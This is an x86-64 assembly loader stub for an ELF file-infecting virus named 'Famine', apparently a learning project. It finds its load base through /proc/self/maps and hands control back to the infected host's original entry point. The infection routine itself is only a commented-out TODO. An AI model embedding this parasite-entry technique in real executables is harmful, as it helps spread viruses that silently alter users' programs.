BITS 64

global _start

SYS_OPEN equ 2
SYS_CLOSE equ 3
SYS_LSEEK equ 8
SYS_EXIT equ 60
ALLOC_SPACE equ 16

section .text

_start:
    push rbp
    mov rbp, rsp

    push rbx
    push rcx
    push rdx
    push rdi
    push rsi
    push r8
    push r9
    push r10
    push r11
    push r12

    call get_base_addr
    mov rbx, rax

    mov rax, 0x000a454e494d4146
    push rax
    mov rdx, 7
    lea rsi, [rsp]
    mov rdi, 1
    mov rax, 1
    syscall
    pop rax

    ; TODO: create s_famine structure

    ;; execute famine
    ;mov rax, qword [rel famine_off]
    ;add rax, rbx
    ;call rax

    mov rcx, qword [rel code_entry_off]
    call ispie
    test rax, rax
    jz .end_payload
    add rcx, rbx

.end_payload:
    mov rax, rcx

    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rsi
    pop rdi
    pop rdx
    pop rcx
    pop rbx

    leave

    jmp rax

ispie:
    movzx rax, byte [rel is_pie]
    ret

get_base_addr:
    push rbp
    mov rbp, rsp

    ; int open(path, O_RDONLY)
    xor rsi, rsi
    lea rdi, [rel proc_file_path]
    mov rax, SYS_OPEN
    syscall

    cmp eax, 0
    jl .open_error

    ; save fd
    push rax

    xor r10, r10
    xor r8, r8
    xor rdi, rdi
    xor rbx, rbx
    xor rdx, rdx

    ; allocate space for /proc/<pid>/maps memory address string
    ; (Max 16 chars from file | usually 12 chars 5567f9154000)
    sub rsp, ALLOC_SPACE

    ; int read(int fd, void *buf, int n)
    mov rdx, 1
    lea rsi, [rsp]
    mov edi, eax                ; fd: eax

.read_characters:
    xor rax, rax
    syscall

    cmp BYTE [rsp], '-'
    je .done
    inc r10b
    mov r8b, BYTE [rsp]

    cmp r8b, '9'
    jle .digit_found

.alphabet_found:
    sub r8b, 0x57               ; R8 stores the extracted byte (0x62('b') - 0x57 = 0xb)
    jmp .load_into_rbx

.digit_found:
    sub r8b, '0'                ; r8 stores Extracted byte

.load_into_rbx:
    shl rbx, 4
    or rbx, r8

.loop:
    add rsp, 1                  ; increment RSI to read character at next location
    lea rsi, [rsp]
    jmp .read_characters

.done:
    sub sp, r10w                ; subtract stack pointer by no. of chars (which are pushed on stack)
    add rsp, ALLOC_SPACE        ; add 16 bytes to RSP (which were reserved for reading address chars)

    pop rdi
    mov rax, SYS_CLOSE
    syscall

    mov rax, rbx

    leave
    ret

.open_error:
    mov rdi, 1
    mov rax, SYS_EXIT
    syscall


proc_file_path db "/proc/self/maps",0
targets dq target1, target2, 0
target1 db "/home/mbucci/tmp/test",0
target2 db "/home/mbucci/tmp/test2",0
is_pie db 0
code_entry_off dq 0xeeeeeeeeeeeeeeee
parasite_size dq 0x4444444444444444
loader_size dq 0x3333333333333333
signature_size dq 0x2222222222222222
payload_off dq 0x1111111111111111
famine_off dq 0x4242424242424242
